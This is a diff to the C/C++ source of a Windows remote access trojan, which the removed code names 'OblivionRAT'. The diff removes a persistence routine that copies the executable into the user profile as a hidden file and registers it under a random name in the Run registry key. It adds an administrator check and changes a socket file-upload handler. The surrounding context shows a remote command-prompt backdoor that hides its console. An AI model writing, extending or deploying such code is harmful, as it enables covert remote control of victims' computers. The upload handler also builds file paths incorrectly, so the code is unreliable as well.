@@ -1,11 +1,4 @@
-﻿#include <stdio.h>
-#include <stdlib.h>
-#include <windows.h>
-#include <string.h>
-#include <winsock.h>
-#include <iostream>
-#include <sys/stat.h>
-
+﻿#include "reg.h"
 #pragma comment(lib, "ws2_32.lib")
 
 //our variables, we need them globally to use them in all functions
@@ -21,14 +14,17 @@ PROCESS_INFORMATION procinfo; //process info struct needed for CreateProcess
 int bytesWritten;  //number of bytes written gets stored here
 DWORD bytesRead, avail, exitcode; //number of bytes read, number of bytes available
 //and the exitcode
-
 void CommandPrompt(void);       //the function to give the command prompt
-void AddToStartup(void);        //function to add the program to startup
-void handle_upload(SOCKET sock); //the function to create new files with the command prompt
-std::string GenerateRandomString(int length);
-
+void handle_upload(SOCKET sock); //the function to handle file uploads
+BOOL IsRunAsAdmin(); //function to check if the program is running as admin
+void ShowErrorMessage(const wchar_t* message); //function to show an error message
 int main() //the main function
 {
+   if (!IsRunAsAdmin())
+    {
+        ShowErrorMessage(L"Please run the program as administrator.");
+        return 1;
+    }
     // Add the program to startup
     AddToStartup();
     //hide console
@@ -197,58 +193,6 @@ closeup:
     }
 }
 
-wchar_t reg[] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-wchar_t reg2[] = L"MonProgrammeServeur";
-
-void AddToStartup(void)
-{
-    wchar_t buffer[MAX_PATH];
-
-    // Obtenir le chemin du fichier exécutable actuel
-    if (GetModuleFileName(NULL, buffer, MAX_PATH) == 0) {
-        std::wcerr << L"Erreur lors de l'obtention du chemin du fichier exécutable : " << GetLastError() << std::endl;
-    }
-
-    // Définir le chemin de destination en utilisant %userprofile%
-    wchar_t dest[MAX_PATH];
-    ExpandEnvironmentStrings(L"%userprofile%\\OblivionRAT.exe", dest, MAX_PATH);
-
-    // Copier le fichier exécutable vers le répertoire de destination
-    if (!CopyFile(buffer, dest, FALSE)) {
-        std::wcerr << L"Erreur lors de la copie du fichier : " << GetLastError() << std::endl;
-    }
-
-    // Définir l'attribut caché sur le fichier
-    if (!SetFileAttributes(dest, FILE_ATTRIBUTE_HIDDEN)) {
-        std::wcerr << L"Erreur lors de la définition de l'attribut caché : " << GetLastError() << std::endl;
-    }
-
-    std::wcout << L"Fichier copié avec succès dans : " << dest << std::endl;
-    
-    // Générer une chaîne de caractères aléatoire
-    std::string randomStr = GenerateRandomString(10);
-
-    // Convertir la chaîne aléatoire en une chaîne wide
-    int wstr_size = MultiByteToWideChar(CP_UTF8, 0, randomStr.c_str(), -1, NULL, 0);
-    wchar_t* wstr = new wchar_t[wstr_size];
-    MultiByteToWideChar(CP_UTF8, 0, randomStr.c_str(), -1, wstr, wstr_size);
-
-    HKEY hKey;
-    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-    if (result == ERROR_SUCCESS)
-    {
-        RegSetValueEx(hKey, wstr, 0, REG_SZ, (const BYTE*)dest, (wcslen(dest) + 1) * sizeof(wchar_t));
-        RegCloseKey(hKey);
-        std::wcout << L"Démarrage automatique configuré avec succès" << std::endl;
-    }
-    else {
-        std::wcerr << L"Erreur lors de l'ouverture de la clé de registre : " << result << std::endl;
-    }
-
-    // Nettoyage
-    delete[] wstr;
-}
-
 void handle_upload(SOCKET sock) {
     char filename[256];
     int received;
@@ -266,15 +210,16 @@ void handle_upload(SOCKET sock) {
     if (newline) {
         *newline = '\0';
     }
-    send(sock, "File created\n", strlen("File created\n"), 0);
-
     // Open the file for writing
+
+	//Add ./ to the filename to save the file in the current directory
+	strcat(filename, "./");
     fp = fopen(filename, "w");
     if (fp == NULL) {
         send(sock, "Error opening file for writing\n", strlen("Error opening file for writing\n"), 0);
         return;
     }
-
+    send(sock, "File created\n", strlen("File created\n"), 0);
     // Receive the file content
     char stop[] = "stop upload";
     while ((received = recv(sock, bufferin, sizeof(bufferin), 0)) > 0) {
@@ -288,16 +233,37 @@ void handle_upload(SOCKET sock) {
     send(sock, "File received successfully\n", strlen("File received successfully\n"), 0);
 }
 
-std::string GenerateRandomString(int length) {
-    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    const int charsetSize = sizeof(charset) - 1;
-    std::string randomString;
+BOOL IsRunAsAdmin()
+{
+    BOOL fIsRunAsAdmin = FALSE;
+    DWORD dwError = ERROR_SUCCESS;
+    PSID pAdministratorsGroup = NULL;
 
-    srand(time(0)); // Initialisation du générateur de nombres aléatoires avec le temps actuel
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    if (!AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup))
+    {
+        dwError = GetLastError();
+    }
+    else
+    {
+        if (!CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin))
+        {
+            dwError = GetLastError();
+        }
 
-    for (int i = 0; i < length; ++i) {
-        randomString += charset[rand() % charsetSize];
+        FreeSid(pAdministratorsGroup);
     }
 
-    return randomString;
+    if (dwError != ERROR_SUCCESS)
+    {
+        std::cerr << "Error checking admin privileges: " << dwError << std::endl;
+    }
+
+    return fIsRunAsAdmin;
+}
+
+void ShowErrorMessage(const wchar_t* message)
+{
+    MessageBox(NULL, message, L"Error", MB_OK | MB_ICONERROR);
 }
